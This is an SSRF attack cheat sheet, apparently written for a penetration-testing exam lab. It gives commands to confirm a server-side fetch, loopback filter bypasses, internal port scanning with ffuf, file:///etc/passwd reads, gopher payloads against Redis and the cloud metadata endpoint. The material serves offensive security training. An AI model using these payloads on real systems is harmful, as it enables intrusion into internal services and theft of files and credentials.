# Server-side request forgery (SSRF)

Check URL fetchers: previews, imports, webhooks, PDF/file converters.

## Confirm the fetch
```bash
python3 -m http.server 8000
curl -G 'http://<IP>/fetch' --data-urlencode 'url=http://<KALI>:8000/ssrf-check-01'
```
- Listener hit = server fetch; reflection alone isn't. No hit → reachability, delayed jobs.

## What it can reach
Compare a known local port with an unused one.

```bash
curl -G 'http://<IP>/fetch' --data-urlencode 'url=http://127.0.0.1:8080/'
```
Filter bypass (`127.0.0.1` = target's loopback):

```text
http://allowed.example@127.0.0.1:8080/
http://127.1:8080/
http://[::1]:8080/
http://<allowed-host>/redirect-to-loopback
```

## Scan internal ports
Pick a closed port for the baseline response size, then diff.

```bash
seq 1 10000 > ports.txt
ffuf -u 'http://<IP>/fetch?url=http://127.0.0.1:FUZZ/' -w ports.txt -fs <BASELINE-SIZE>
```
- Differences may be status, size, timing or error text: choose the filter from the closed-port response.
- Other hosts: `http://<INTERNAL-IP>:<PORT>/`. Hostnames from DNS/`/etc/hosts` of the target also resolve for the server.

## Other schemes
```text
file:///etc/passwd
file:///C:/Windows/win.ini
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_<URL-ENCODED-REDIS-COMMANDS>
```
- `file://` works only if the fetcher is libcurl/PHP-style and not an HTTP-only client.
- `gopher://` sends raw bytes to an internal service (Redis, FastCGI, MySQL without auth). Generate the payload with `gopherus --exploit redis` (or `mysql`, `fastcgi`), URL-encode once more if the fetcher re-decodes.
- Cloud-hosted box: `http://169.254.169.254/latest/meta-data/` (rare on the exam network).
- Blind: only the listener hit tells you; use the response timing to map ports.
